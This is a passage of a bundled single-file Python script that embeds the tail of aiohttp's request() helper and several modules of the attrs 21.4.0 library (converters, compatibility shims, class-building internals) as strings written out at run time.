response\r\n       does not have Content-Length header.\r\n    loop - Optional event loop.\r\n    timeout - Optional ClientTimeout settings structure, 5min\r\n       total timeout by default.\r\n    Usage::\r\n      >>> import aiohttp\r\n      >>> resp = await aiohttp.request(\'GET\', \'http://python.org/\')\r\n      >>> resp\r\n      <ClientResponse(python.org/) [200]>\r\n      >>> data = await resp.read()\r\n    """\r\n    connector_owner = False\r\n    if connector is None:\r\n        connector_owner = True\r\n        connector = TCPConnector(loop=loop, force_close=True)\r\n\r\n    session = ClientSession(\r\n        loop=loop,\r\n        cookies=cookies,\r\n        version=version,\r\n        timeout=timeout,\r\n        connector=connector,\r\n        connector_owner=connector_owner,\r\n    )\r\n\r\n    return _SessionRequestContextManager(\r\n        session._request(\r\n            method,\r\n            url,\r\n            params=params,\r\n            data=data,\r\n            json=json,\r\n            headers=headers,\r\n            skip_auto_headers=skip_auto_headers,\r\n            auth=auth,\r\n            allow_redirects=allow_redirects,\r\n            max_redirects=max_redirects,\r\n            compress=compress,\r\n            chunked=chunked,\r\n            expect100=expect100,\r\n            raise_for_status=raise_for_status,\r\n            read_until_eof=read_until_eof,\r\n            proxy=proxy,\r\n            proxy_auth=proxy_auth,\r\n            read_bufsize=read_bufsize,\r\n        ),\r\n        session,\r\n    )\r\n')
    __stickytape_write_module('attr/__init__.py', b'# SPDX-License-Identifier: MIT\n\nfrom __future__ import absolute_import, division, print_function\n\nimport sys\n\nfrom functools import partial\n\nfrom . import converters, exceptions, filters, setters, validators\nfrom ._cmp import cmp_using\nfrom ._config import get_run_validators, set_run_validators\nfrom ._funcs import asdict, assoc, astuple, evolve, has, resolve_types\nfrom ._make import (\n    NOTHING,\n    Attribute,\n    Factory,\n    attrib,\n    attrs,\n    fields,\n    fields_dict,\n    make_class,\n    validate,\n)\nfrom ._version_info import VersionInfo\n\n\n__version__ = "21.4.0"\n__version_info__ = VersionInfo._from_version_string(__version__)\n\n__title__ = "attrs"\n__description__ = "Classes Without Boilerplate"\n__url__ = "https://www.attrs.org/"\n__uri__ = __url__\n__doc__ = __description__ + " <" + __uri__ + ">"\n\n__author__ = "Hynek Schlawack"\n__email__ = "hs@ox.cx"\n\n__license__ = "MIT"\n__copyright__ = "Copyright (c) 2015 Hynek Schlawack"\n\n\ns = attributes = attrs\nib = attr = attrib\ndataclass = partial(attrs, auto_attribs=True)  # happy Easter ;)\n\n__all__ = [\n    "Attribute",\n    "Factory",\n    "NOTHING",\n    "asdict",\n    "assoc",\n    "astuple",\n    "attr",\n    "attrib",\n    "attributes",\n    "attrs",\n    "cmp_using",\n    "converters",\n    "evolve",\n    "exceptions",\n    "fields",\n    "fields_dict",\n    "filters",\n    "get_run_validators",\n    "has",\n    "ib",\n    "make_class",\n    "resolve_types",\n    "s",\n    "set_run_validators",\n    "setters",\n    "validate",\n    "validators",\n]\n\nif sys.version_info[:2] >= (3, 6):\n    from ._next_gen import define, field, frozen, mutable  # noqa: F401\n\n    __all__.extend(("define", "field", "frozen", "mutable"))\n')
    __stickytape_write_module('attr/converters.py', b'# SPDX-License-Identifier: MIT\n\n"""\nCommonly useful converters.\n"""\n\nfrom __future__ import absolute_import, division, print_function\n\nfrom ._compat import PY2\nfrom ._make import NOTHING, Factory, pipe\n\n\nif not PY2:\n    import inspect\n    import typing\n\n\n__all__ = [\n    "default_if_none",\n    "optional",\n    "pipe",\n    "to_bool",\n]\n\n\ndef optional(converter):\n    """\n    A converter that allows an attribute to be optional. An optional attribute\n    is one which can be set to ``None``.\n\n    Type annotations will be inferred from the wrapped converter\'s, if it\n    has any.\n\n    :param callable converter: the converter that is used for non-``None``\n        values.\n\n    .. versionadded:: 17.1.0\n    """\n\n    def optional_converter(val):\n        if val is None:\n            return None\n        return converter(val)\n\n    if not PY2:\n        sig = None\n        try:\n            sig = inspect.signature(converter)\n        except (ValueError, TypeError):  # inspect failed\n            pass\n        if sig:\n            params = list(sig.parameters.values())\n            if params and params[0].annotation is not inspect.Parameter.empty:\n                optional_converter.__annotations__["val"] = typing.Optional[\n                    params[0].annotation\n                ]\n            if sig.return_annotation is not inspect.Signature.empty:\n                optional_converter.__annotations__["return"] = typing.Optional[\n                    sig.return_annotation\n                ]\n\n    return optional_converter\n\n\ndef default_if_none(default=NOTHING, factory=None):\n    """\n    A converter that allows to replace ``None`` values by *default* or the\n    result of *factory*.\n\n    :param default: Value to be used if ``None`` is passed. Passing an instance\n       of `attrs.Factory` is supported, however the ``takes_self`` option\n       is *not*.\n    :param callable factory: A callable that takes no parameters whose result\n       is used if ``None`` is passed.\n\n    :raises TypeError: If **neither** *default* or *factory* is passed.\n    :raises TypeError: If **both** *default* and *factory* are passed.\n    :raises ValueError: If an instance of `attrs.Factory` is passed with\n       ``takes_self=True``.\n\n    .. versionadded:: 18.2.0\n    """\n    if default is NOTHING and factory is None:\n        raise TypeError("Must pass either `default` or `factory`.")\n\n    if default is not NOTHING and factory is not None:\n        raise TypeError(\n            "Must pass either `default` or `factory` but not both."\n        )\n\n    if factory is not None:\n        default = Factory(factory)\n\n    if isinstance(default, Factory):\n        if default.takes_self:\n            raise ValueError(\n                "`takes_self` is not supported by default_if_none."\n            )\n\n        def default_if_none_converter(val):\n            if val is not None:\n                return val\n\n            return default.factory()\n\n    else:\n\n        def default_if_none_converter(val):\n            if val is not None:\n                return val\n\n            return default\n\n    return default_if_none_converter\n\n\ndef to_bool(val):\n    """\n    Convert "boolean" strings (e.g., from env. vars.) to real booleans.\n\n    Values mapping to :code:`True`:\n\n    - :code:`True`\n    - :code:`"true"` / :code:`"t"`\n    - :code:`"yes"` / :code:`"y"`\n    - :code:`"on"`\n    - :code:`"1"`\n    - :code:`1`\n\n    Values mapping to :code:`False`:\n\n    - :code:`False`\n    - :code:`"false"` / :code:`"f"`\n    - :code:`"no"` / :code:`"n"`\n    - :code:`"off"`\n    - :code:`"0"`\n    - :code:`0`\n\n    :raises ValueError: for any other value.\n\n    .. versionadded:: 21.3.0\n    """\n    if isinstance(val, str):\n        val = val.lower()\n    truthy = {True, "true", "t", "yes", "y", "on", "1", 1}\n    falsy = {False, "false", "f", "no", "n", "off", "0", 0}\n    try:\n        if val in truthy:\n            return True\n        if val in falsy:\n            return False\n    except TypeError:\n        # Raised when "val" is not hashable (e.g., lists)\n        pass\n    raise ValueError("Cannot convert value to bool: {}".format(val))\n')
    __stickytape_write_module('attr/_compat.py', b'# SPDX-License-Identifier: MIT\n\nfrom __future__ import absolute_import, division, print_function\n\nimport platform\nimport sys\nimport threading\nimport types\nimport warnings\n\n\nPY2 = sys.version_info[0] == 2\nPYPY = platform.python_implementation() == "PyPy"\nPY36 = sys.version_info[:2] >= (3, 6)\nHAS_F_STRINGS = PY36\nPY310 = sys.version_info[:2] >= (3, 10)\n\n\nif PYPY or PY36:\n    ordered_dict = dict\nelse:\n    from collections import OrderedDict\n\n    ordered_dict = OrderedDict\n\n\nif PY2:\n    from collections import Mapping, Sequence\n\n    from UserDict import IterableUserDict\n\n    # We \'bundle\' isclass instead of using inspect as importing inspect is\n    # fairly expensive (order of 10-15 ms for a modern machine in 2016)\n    def isclass(klass):\n        return isinstance(klass, (type, types.ClassType))\n\n    def new_class(name, bases, kwds, exec_body):\n        """\n        A minimal stub of types.new_class that we need for make_class.\n        """\n        ns = {}\n        exec_body(ns)\n\n        return type(name, bases, ns)\n\n    # TYPE is used in exceptions, repr(int) is different on Python 2 and 3.\n    TYPE = "type"\n\n    def iteritems(d):\n        return d.iteritems()\n\n    # Python 2 is bereft of a read-only dict proxy, so we make one!\n    class ReadOnlyDict(IterableUserDict):\n        """\n        Best-effort read-only dict wrapper.\n        """\n\n        def __setitem__(self, key, val):\n            # We gently pretend we\'re a Python 3 mappingproxy.\n            raise TypeError(\n                "\'mappingproxy\' object does not support item assignment"\n            )\n\n        def update(self, _):\n            # We gently pretend we\'re a Python 3 mappingproxy.\n            raise AttributeError(\n                "\'mappingproxy\' object has no attribute \'update\'"\n            )\n\n        def __delitem__(self, _):\n            # We gently pretend we\'re a Python 3 mappingproxy.\n            raise TypeError(\n                "\'mappingproxy\' object does not support item deletion"\n            )\n\n        def clear(self):\n            # We gently pretend we\'re a Python 3 mappingproxy.\n            raise AttributeError(\n                "\'mappingproxy\' object has no attribute \'clear\'"\n            )\n\n        def pop(self, key, default=None):\n            # We gently pretend we\'re a Python 3 mappingproxy.\n            raise AttributeError(\n                "\'mappingproxy\' object has no attribute \'pop\'"\n            )\n\n        def popitem(self):\n            # We gently pretend we\'re a Python 3 mappingproxy.\n            raise AttributeError(\n                "\'mappingproxy\' object has no attribute \'popitem\'"\n            )\n\n        def setdefault(self, key, default=None):\n            # We gently pretend we\'re a Python 3 mappingproxy.\n            raise AttributeError(\n                "\'mappingproxy\' object has no attribute \'setdefault\'"\n            )\n\n        def __repr__(self):\n            # Override to be identical to the Python 3 version.\n            return "mappingproxy(" + repr(self.data) + ")"\n\n    def metadata_proxy(d):\n        res = ReadOnlyDict()\n        res.data.update(d)  # We blocked update, so we have to do it like this.\n        return res\n\n    def just_warn(*args, **kw):  # pragma: no cover\n        """\n        We only warn on Python 3 because we are not aware of any concrete\n        consequences of not setting the cell on Python 2.\n        """\n\nelse:  # Python 3 and later.\n    from collections.abc import Mapping, Sequence  # noqa\n\n    def just_warn(*args, **kw):\n        """\n        We only warn on Python 3 because we are not aware of any concrete\n        consequences of not setting the cell on Python 2.\n        """\n        warnings.warn(\n            "Running interpreter doesn\'t sufficiently support code object "\n            "introspection.  Some features like bare super() or accessing "\n            "__class__ will not work with slotted classes.",\n            RuntimeWarning,\n            stacklevel=2,\n        )\n\n    def isclass(klass):\n        return isinstance(klass, type)\n\n    TYPE = "class"\n\n    def iteritems(d):\n        return d.items()\n\n    new_class = types.new_class\n\n    def metadata_proxy(d):\n        return types.MappingProxyType(dict(d))\n\n\ndef make_set_closure_cell():\n    """Return a function of two arguments (cell, value) which sets\n    the value stored in the closure cell `cell` to `value`.\n    """\n    # pypy makes this easy. (It also supports the logic below, but\n    # why not do the easy/fast thing?)\n    if PYPY:\n\n        def set_closure_cell(cell, value):\n            cell.__setstate__((value,))\n\n        return set_closure_cell\n\n    # Otherwise gotta do it the hard way.\n\n    # Create a function that will set its first cellvar to `value`.\n    def set_first_cellvar_to(value):\n        x = value\n        return\n\n        # This function will be eliminated as dead code, but\n        # not before its reference to `x` forces `x` to be\n        # represented as a closure cell rather than a local.\n        def force_x_to_be_a_cell():  # pragma: no cover\n            return x\n\n    try:\n        # Extract the code object and make sure our assumptions about\n        # the closure behavior are correct.\n        if PY2:\n            co = set_first_cellvar_to.func_code\n        else:\n            co = set_first_cellvar_to.__code__\n        if co.co_cellvars != ("x",) or co.co_freevars != ():\n            raise AssertionError  # pragma: no cover\n\n        # Convert this code object to a code object that sets the\n        # function\'s first _freevar_ (not cellvar) to the argument.\n        if sys.version_info >= (3, 8):\n            # CPython 3.8+ has an incompatible CodeType signature\n            # (added a posonlyargcount argument) but also added\n            # CodeType.replace() to do this without counting parameters.\n            set_first_freevar_code = co.replace(\n                co_cellvars=co.co_freevars, co_freevars=co.co_cellvars\n            )\n        else:\n            args = [co.co_argcount]\n            if not PY2:\n                args.append(co.co_kwonlyargcount)\n            args.extend(\n                [\n                    co.co_nlocals,\n                    co.co_stacksize,\n                    co.co_flags,\n                    co.co_code,\n                    co.co_consts,\n                    co.co_names,\n                    co.co_varnames,\n                    co.co_filename,\n                    co.co_name,\n                    co.co_firstlineno,\n                    co.co_lnotab,\n                    # These two arguments are reversed:\n                    co.co_cellvars,\n                    co.co_freevars,\n                ]\n            )\n            set_first_freevar_code = types.CodeType(*args)\n\n        def set_closure_cell(cell, value):\n            # Create a function using the set_first_freevar_code,\n            # whose first closure cell is `cell`. Calling it will\n            # change the value of that cell.\n            setter = types.FunctionType(\n                set_first_freevar_code, {}, "setter", (), (cell,)\n            )\n            # And call it to set the cell.\n            setter(value)\n\n        # Make sure it works on this interpreter:\n        def make_func_with_cell():\n            x = None\n\n            def func():\n                return x  # pragma: no cover\n\n            return func\n\n        if PY2:\n            cell = make_func_with_cell().func_closure[0]\n        else:\n            cell = make_func_with_cell().__closure__[0]\n        set_closure_cell(cell, 100)\n        if cell.cell_contents != 100:\n            raise AssertionError  # pragma: no cover\n\n    except Exception:\n        return just_warn\n    else:\n        return set_closure_cell\n\n\nset_closure_cell = make_set_closure_cell()\n\n# Thread-local global to track attrs instances which are already being repr\'d.\n# This is needed because there is no other (thread-safe) way to pass info\n# about the instances that are already being repr\'d through the call stack\n# in order to ensure we don\'t perform infinite recursion.\n#\n# For instance, if an instance contains a dict which contains that instance,\n# we need to know that we\'re already repr\'ing the outside instance from within\n# the dict\'s repr() call.\n#\n# This lives here rather than in _make.py so that the functions in _make.py\n# don\'t have a direct reference to the thread-local in their globals dict.\n# If they have such a reference, it breaks cloudpickle.\nrepr_context = threading.local()\n')
    __stickytape_write_module('attr/_make.py', b'# SPDX-License-Identifier: MIT\n\nfrom __future__ import absolute_import, division, print_function\n\nimport copy\nimport inspect\nimport linecache\nimport sys\nimport warnings\n\nfrom operator import itemgetter\n\n# We need to import _compat itself in addition to the _compat members to avoid\n# having the thread-local in the globals here.\nfrom . import _compat, _config, setters\nfrom ._compat import (\n    HAS_F_STRINGS,\n    PY2,\n    PY310,\n    PYPY,\n    isclass,\n    iteritems,\n    metadata_proxy,\n    new_class,\n    ordered_dict,\n    set_closure_cell,\n)\nfrom .exceptions import (\n    DefaultAlreadySetError,\n    FrozenInstanceError,\n    NotAnAttrsClassError,\n    PythonTooOldError,\n    UnannotatedAttributeError,\n)\n\n\nif not PY2:\n    import typing\n\n\n# This is used at least twice, so cache it here.\n_obj_setattr = object.__setattr__\n_init_converter_pat = "__attr_converter_%s"\n_init_factory_pat = "__attr_factory_{}"\n_tuple_property_pat = (\n    "    {attr_name} = _attrs_property(_attrs_itemgetter({index}))"\n)\n_classvar_prefixes = (\n    "typing.ClassVar",\n    "t.ClassVar",\n    "ClassVar",\n    "typing_extensions.ClassVar",\n)\n# we don\'t use a double-underscore prefix because that triggers\n# name mangling when trying to create a slot for the field\n# (when slots=True)\n_hash_cache_field = "_attrs_cached_hash"\n\n_empty_metadata_singleton = metadata_proxy({})\n\n# Unique object for unequivocal getattr() defaults.\n_sentinel = object()\n\n_ng_default_on_setattr = setters.pipe(setters.convert, setters.validate)\n\n\nclass _Nothing(object):\n    """\n    Sentinel class to indicate the lack of a value when ``None`` is ambiguous.\n\n    ``_Nothing`` is a singleton. There is only ever one of it.\n\n    .. versionchanged:: 21.1.0 ``bool(NOTHING)`` is now False.\n    """\n\n    _singleton = None\n\n    def __new__(cls):\n        if _Nothing._singleton is None:\n            _Nothing._singleton = super(_Nothing, cls).__new__(cls)\n        return _Nothing._singleton\n\n    def __repr__(self):\n        return "NOTHING"\n\n    def __bool__(self):\n        return False\n\n    def __len__(self):\n        return 0  # __bool__ for Python 2\n\n\nNOTHING = _Nothing()\n"""\nSentinel to indicate the lack of a value when ``None`` is ambiguous.\n"""\n\n\nclass _CacheHashWrapper(int):\n    """\n    An integer subclass that pickles / copies as None\n\n    This is used for non-slots classes with ``cache_hash=True``, to avoid\n    serializing a potentially (even likely) invalid hash value. Since ``None``\n    is the default value for uncalculated hashes, whenever this is copied,\n    the copy\'s value for the hash should automatically reset.\n\n    See GH #613 for more details.\n    """\n\n    if PY2:\n        # For some reason `type(None)` isn\'t callable in Python 2, but we don\'t\n        # actually need a constructor for None objects, we just need any\n        # available function that returns None.\n        def __reduce__(self, _none_constructor=getattr, _args=(0, "", None)):\n            return _none_constructor, _args\n\n    else:\n\n        def __reduce__(self, _none_constructor=type(None), _args=()):\n            return _none_constructor, _args\n\n\ndef attrib(\n    default=NOTHING,\n    validator=None,\n    repr=True,\n    cmp=None,\n    hash=None,\n    init=True,\n    metadata=None,\n    type=None,\n    converter=None,\n    factory=None,\n    kw_only=False,\n    eq=None,\n    order=None,\n    on_setattr=None,\n):\n    """\n    Create a new attribute on a class.\n\n    ..  warning::\n\n        Does *not* do anything unless the class is also decorated with\n        `attr.s`!\n\n    :param default: A value that is used if an ``attrs``-generated ``__init__``\n        is used and no value is passed while instantiating or the attribute is\n        excluded using ``init=False``.\n\n        If the value is an instance of `attrs.Factory`, its callable will be\n        used to construct a new value (useful for mutable data types like lists\n        or dicts).\n\n        If a default is not set (or set manually to `attrs.NOTHING`), a value\n        *must* be supplied when instantiating; otherwise a `TypeError`\n        will be raised.\n\n        The default can also be set using decorator notation as shown below.\n\n    :type default: Any value\n\n    :param callable factory: Syntactic sugar for\n        ``default=attr.Factory(factory)``.\n\n    :param validator: `callable` that is called by ``attrs``-generated\n        ``__init__`` methods after the instance has been initialized.  They\n        receive the initialized instance, the :func:`~attrs.Attribute`, and the\n        passed value.\n\n        The return value is *not* inspected so the validator has to throw an\n        exception itself.\n\n        If a `list` is passed, its items are treated as validators and must\n        all pass.\n\n        Validators can be globally disabled and re-enabled using\n        `get_run_validators`.\n\n        The validator can also be set using decorator notation as shown below.\n\n    :type validator: `callable` or a `list` of `callable`\\\\ s.\n\n    :param repr: Include this attribute in the generated ``__repr__``\n        method. If ``True``, include the attribute; if ``False``, omit it. By\n        default, the built-in ``repr()`` function is used. To override how the\n        attribute value is formatted, pass a ``callable`` that takes a single\n        value and returns a string. Note that the resulting string is used\n        as-is, i.e. it will be used directly *instead* of calling ``repr()``\n        (the default).\n    :type repr: a `bool` or a `callable` to use a custom function.\n\n    :param eq: If ``True`` (default), include this attribute in the\n        generated ``__eq__`` and ``__ne__`` methods that check two instances\n        for equality. To override how the attribute value is compared,\n        pass a ``callable`` that takes a single value and returns the value\n        to be compared.\n    :type eq: a `bool` or a `callable`.\n\n    :param order: If ``True`` (default), include this attributes in the\n        generated ``__lt__``, ``__le__``, ``__gt__`` and ``__ge__`` methods.\n        To override how the attribute value is ordered,\n        pass a ``callable`` that takes a single value and returns the value\n        to be ordered.\n    :type order: a `bool` or a `callable`.\n\n    :param cmp: Setting *cmp* is equivalent to setting *eq* and *order* to the\n        same value. Must not be mixed with *eq* or *order*.\n    :type cmp: a `bool` or a `callable`.\n\n    :param Optional[bool] hash: Include this attribute in the generated\n        ``__hash__`` method.  If ``None`` (default), mirror *eq*\'s value.  This\n        is the correct behavior according the Python spec.  Setting this value\n        to anything else than ``None`` is *discouraged*.\n    :param bool init: Include this attribute in the generated ``__init__``\n        method.  It is possible to set this to ``False`` and set a default\n        value.  In that case this attributed is unconditionally initialized\n        with the specified default value or factory.\n    :param callable converter: `callable` that is called by\n        ``attrs``-generated ``__init__`` methods to convert attribute\'s value\n        to the desired format.  It is given the passed-in value, and the\n        returned value will be used as the new value of the attribute.  The\n        value is converted before being passed to the validator, if any.\n    :param metadata: An arbitrary mapping, to be used by third-party\n        components.  See `extending_metadata`.\n    :param type: The type of the attribute.  In Python 3.6 or greater, the\n        preferred method to specify the type is using a variable annotation\n        (see `PEP 526 <https://www.python.org/dev/peps/pep-0526/>`_).\n        This argument is provided for backward compatibility.\n        Regardless of the approach used, the type will be stored on\n        ``Attribute.type``.\n\n        Please note that ``attrs`` doesn\'t do anything with this metadata by\n        itself. You can use it as part of your own code or for\n        `static type checking <types>`.\n    :param kw_only: Make this attribute keyword-only (Python 3+)\n        in the generated ``__init__`` (if ``init`` is ``False``, this\n        parameter is ignored).\n    :param on_setattr: Allows to overwrite the *on_setattr* setting from\n        `attr.s`. If left `None`, the *on_setattr* value from `attr.s` is used.\n        Set to `attrs.setters.NO_OP` to run **no** `setattr` hooks for this\n        attribute -- regardless of the setting in `attr.s`.\n    :type on_setattr: `callable`, or a list of callables, or `None`, or\n        `attrs.setters.NO_OP`\n\n    .. versionadded:: 15.2.0 *convert*\n    .. versionadded:: 16.3.0 *metadata*\n    .. versionchanged:: 17.1.0 *validator* can be a ``list`` now.\n    .. versionchanged:: 17.1.0\n       *hash* is ``None`` and therefore mirrors *eq* by default.\n    .. versionadded:: 17.3.0 *type*\n    .. deprecated:: 17.4.0 *convert*\n    .. versionadded:: 17.4.0 *converter* as a replacement for the deprecated\n       *convert* to achieve consistency with other noun-based arguments.\n    .. versionadded:: 18.1.0\n       ``factory=f`` is syntactic sugar for ``default=attr.Factory(f)``.\n    .. versionadded:: 18.2.0 *kw_only*\n    .. versionchanged:: 19.2.0 *convert* keyword argument removed.\n    .. versionchanged:: 19.2.0 *repr* also accepts a custom callable.\n    .. deprecated:: 19.2.0 *cmp* Removal on or after 2021-06-01.\n    .. versionadded:: 19.2.0 *eq* and *order*\n    .. versionadded:: 20.1.0 *on_setattr*\n    .. versionchanged:: 20.3.0 *kw_only* backported to Python 2\n    .. versionchanged:: 21.1.0\n       *eq*, *order*, and *cmp* also accept a custom callable\n    .. versionchanged:: 21.1.0 *cmp* undeprecated\n    """\n    eq, eq_key, order, order_key = _determine_attrib_eq_order(\n        cmp, eq, order, True\n    )\n\n    if hash is not None and hash is not True and hash is not False:\n        raise TypeError(\n            "Invalid value for hash.  Must be True, False, or None."\n        )\n\n    if factory is not None:\n        if default is not NOTHING:\n            raise ValueError(\n                "The `default` and `factory` arguments are mutually "\n                "exclusive."\n            )\n        if not callable(factory):\n            raise ValueError("The `factory` argument must be a callable.")\n        default = Factory(factory)\n\n    if metadata is None:\n        metadata = {}\n\n    # Apply syntactic sugar by auto-wrapping.\n    if isinstance(on_setattr, (list, tuple)):\n        on_setattr = setters.pipe(*on_setattr)\n\n    if validator and isinstance(validator, (list, tuple)):\n        validator = and_(*validator)\n\n    if converter and isinstance(converter, (list, tuple)):\n        converter = pipe(*converter)\n\n    return _CountingAttr(\n        default=default,\n        validator=validator,\n        repr=repr,\n        cmp=None,\n        hash=hash,\n        init=init,\n        converter=converter,\n        metadata=metadata,\n        type=type,\n        kw_only=kw_only,\n        eq=eq,\n        eq_key=eq_key,\n        order=order,\n        order_key=order_key,\n        on_setattr=on_setattr,\n    )\n\n\ndef _compile_and_eval(script, globs, locs=None, filename=""):\n    """\n    "Exec" the script with the given global (globs) and local (locs) variables.\n    """\n    bytecode = compile(script, filename, "exec")\n    eval(bytecode, globs, locs)\n\n\ndef _make_method(name, script, filename, globs=None):\n    """\n    Create the method with the script given and return the method object.\n    """\n    locs = {}\n    if globs is None:\n        globs = {}\n\n    # In order of debuggers like PDB being able to step through the code,\n    # we add a fake linecache entry.\n    count = 1\n    base_filename = filename\n    while True:\n        linecache_tuple = (\n            len(script),\n            None,\n            script.splitlines(True),\n            filename,\n        )\n        old_val = linecache.cache.setdefault(filename, linecache_tuple)\n        if old_val == linecache_tuple:\n            break\n        else:\n            filename = "{}-{}>".format(base_filename[:-1], count)\n            count += 1\n\n    _compile_and_eval(script, globs, locs, filename)\n\n    return locs[name]\n\n\ndef _make_attr_tuple_class(cls_name, attr_names):\n    """\n    Create a tuple subclass to hold `Attribute`s for an `attrs` class.\n\n    The subclass is a bare tuple with properties for names.\n\n    class MyClassAttributes(tuple):\n        __slots__ = ()\n        x = property(itemgetter(0))\n    """\n    attr_class_name = "{}Attributes".format(cls_name)\n    attr_class_template = [\n        "class {}(tuple):".format(attr_class_name),\n        "    __slots__ = ()",\n    ]\n    if attr_names:\n        for i, attr_name in enumerate(attr_names):\n            attr_class_template.append(\n                _tuple_property_pat.format(index=i, attr_name=attr_name)\n            )\n    else:\n        attr_class_template.append("    pass")\n    globs = {"_attrs_itemgetter": itemgetter, "_attrs_property": property}\n    _compile_and_eval("\\n".join(attr_class_template), globs)\n    return globs[attr_class_name]\n\n\n# Tuple class for extracted attributes from a class definition.\n# `base_attrs` is a subset of `attrs`.\n_Attributes = _make_attr_tuple_class(\n    "_Attributes",\n    [\n        # all attributes to build dunder methods for\n        "attrs",\n        # attributes that have been inherited\n        "base_attrs",\n        # map inherited attributes to their originating classes\n        "base_attrs_map",\n    ],\n)\n\n\ndef _is_class_var(annot):\n    """\n    Check whether *annot* is a typing.ClassVar.\n\n    The string comparison hack is used to avoid evaluating all string\n    annotations which would put attrs-based classes at a performance\n    disadvantage compared to plain old classes.\n    """\n    annot = str(annot)\n\n    # Annotation can be quoted.\n    if annot.startswith(("\'", \'"\')) and annot.endswith(("\'", \'"\')):\n        annot = annot[1:-1]\n\n    return annot.startswith(_classvar_prefixes)\n\n\ndef _has_own_attribute(cls, attrib_name):\n    """\n    Check whether *cls* defines *attrib_name* (and doesn\'t just inherit it).\n\n    Requires Python 3.\n    """\n    attr = getattr(cls, attrib_name, _sentinel)\n    if attr is _sentinel:\n        return False\n\n    for base_cls in cls.__mro__[1:]:\n        a = getattr(base_cls, attrib_name, None)\n        if attr is a:\n            return False\n\n    return True\n\n\ndef _get_annotations(cls):\n    """\n    Get annotations for *cls*.\n    """\n    if _has_own_attribute(cls, "__annotations__"):\n        return cls.__annotations__\n\n    return {}\n\n\ndef _counter_getter(e):\n    """\n    Key function for sorting to avoid re-creating a lambda for every class.\n    """\n    return e[1].counter\n\n\ndef _collect_base_attrs(cls, taken_attr_names):\n    """\n    Collect attr.ibs from base classes of *cls*, except *taken_attr_names*.\n    """\n    base_attrs = []\n    base_attr_map = {}  # A dictionary of base attrs to their classes.\n\n    # Traverse the MRO and collect attributes.\n    for base_cls in reversed(cls.__mro__[1:-1]):\n        for a in getattr(base_cls, "__attrs_attrs__", []):\n            if a.inherited or a.name in taken_attr_names:\n                continue\n\n            a = a.evolve(inherited=True)\n            base_attrs.append(a)\n            base_attr_map[a.name] = base_cls\n\n    # For each name, only keep the freshest definition i.e. the furthest at the\n    # back.  base_attr_map is fine because it gets overwritten with every new\n    # instance.\n    filtered = []\n    seen = set()\n    for a in reversed(base_attrs):\n        if a.name in seen:\n            continue\n        filtered.insert(0, a)\n        seen.add(a.name)\n\n    return filtered, base_attr_map\n\n\ndef _collect_base_attrs_broken(cls, taken_attr_names):\n    """\n    Collect attr.ibs from base classes of *cls*, except *taken_attr_names*.\n\n    N.B. *taken_attr_names* will be mutated.\n\n    Adhere to the old incorrect behavior.\n\n    Notably it collects from the front and considers inherited attributes which\n    leads to the buggy behavior reported in #428.\n    """\n    base_attrs = []\n    base_attr_map = {}  # A dictionary of base attrs to their classes.\n\n    # Traverse the MRO and collect attributes.\n    for base_cls in cls.__mro__[1:-1]:\n        for a in getattr(base_cls, "__attrs_attrs__", []):\n            if a.name in taken_attr_names:\n                continue\n\n            a = a.evolve(inherited=True)\n            taken_attr_names.add(a.name)\n            base_attrs.append(a)\n            base_attr_map[a.name] = base_cls\n\n    return base_attrs, base_attr_map\n\n\ndef _transform_attrs(\n    cls, these, auto_attribs, kw_only, collect_by_mro, field_transformer\n):\n    """\n    Transform all `_CountingAttr`s on a class into `Attribute`s.\n\n    If *these* is passed, use that and don\'t look for them on the class.\n\n    *collect_by_mro* is True, collect them in the correct MRO order, otherwise\n    use the old -- incorrect -- order.  See #428.\n\n    Return an `_Attributes`.\n    """\n    cd = cls.__dict__\n    anns = _get_annotations(cls)\n\n    if these is not None:\n        ca_list = [(name, ca) for name, ca in iteritems(these)]\n\n        if not isinstance(these, ordered_dict):\n            ca_list.sort(key=_counter_getter)\n    elif auto_attribs is True:\n        ca_names = {\n            name\n            for name, attr in cd.items()\n            if isinstance(attr, _CountingAttr)\n        }\n        ca_list = []\n        annot_names = set()\n        for attr_name, type in anns.items():\n            if _is_class_var(type):\n                continue\n            annot_names.add(attr_name)\n            a = cd.get(attr_name, NOTHING)\n\n            if not isinstance(a, _CountingAttr):\n                if a is NOTHING:\n                    a = attrib()\n                else:\n                    a = attrib(default=a)\n            ca_list.append((attr_name, a))\n\n        unannotated = ca_names - annot_names\n        if len(unannotated) > 0:\n            raise UnannotatedAttributeError(\n                "The following `attr.ib`s lack a type annotation: "\n                + ", ".join(\n                    sorted(unannotated, key=lambda n: cd.get(n).counter)\n                )\n                + "."\n            )\n    else:\n        ca_list = sorted(\n            (\n                (name, attr)\n                for name, attr in cd.items()\n                if isinstance(attr, _CountingAttr)\n            ),\n            key=lambda e: e[1].counter,\n        )\n\n    own_attrs = [\n        Attribute.from_counting_attr(\n            name=attr_name, ca=ca, type=anns.get(attr_name)\n        )\n        for attr_name, ca in ca_list\n    ]\n\n    if collect_by_mro:\n        base_attrs, base_attr_map = _collect_base_attrs(\n            cls, {a.name for a in own_attrs}\n        )\n    else:\n        base_attrs, base_attr_map = _collect_base_attrs_broken(\n            cls, {a.name for a in own_attrs}\n        )\n\n    if kw_only:\n        own_attrs = [a.evolve(kw_only=True) for a in own_attrs]\n        base_attrs = [a.evolve(kw_only=True) for a in base_attrs]\n\n    attrs = base_attrs + own_attrs\n\n    # Mandatory vs non-mandatory attr order only matters when they are part of\n    # the __init__ signature and when they aren\'t kw_only (which are moved to\n    # the end and can be mandatory or non-mandatory in any order, as they will\n    # be specified as keyword args anyway). Check the order of those attrs:\n    had_default = False\n    for a in (a for a in attrs if a.init is not False and a.kw_only is False):\n        if had_default is True and a.default is NOTHING:\n            raise ValueError(\n                "No mandatory attributes allowed after an attribute with a "\n                "default value or factory.  Attribute in question: %r" % (a,)\n            )\n\n        if had_default is False and a.default is not NOTHING:\n            had_default = True\n\n    if field_transformer is not None:\n        attrs = field_transformer(cls, attrs)\n\n    # Create AttrsClass *after* applying the field_transformer since it may\n    # add or remove attributes!\n    attr_names = [a.name for a in attrs]\n    AttrsClass = _make_attr_tuple_class(cls.__name__, attr_names)\n\n    return _Attributes((AttrsClass(attrs), base_attrs, base_attr_map))\n\n\nif PYPY:\n\n    def _frozen_setattrs(self, name, value):\n        """\n        Attached to frozen classes as __setattr__.\n        """\n        if isinstance(self, BaseException) and name in (\n            "__cause__",\n            "__context__",\n        ):\n            BaseException.__setattr__(self, name, value)\n            return\n\n        raise FrozenInstanceError()\n\nelse:\n\n    def _frozen_setattrs(self, name, value):\n        """\n        Attached to frozen classes as 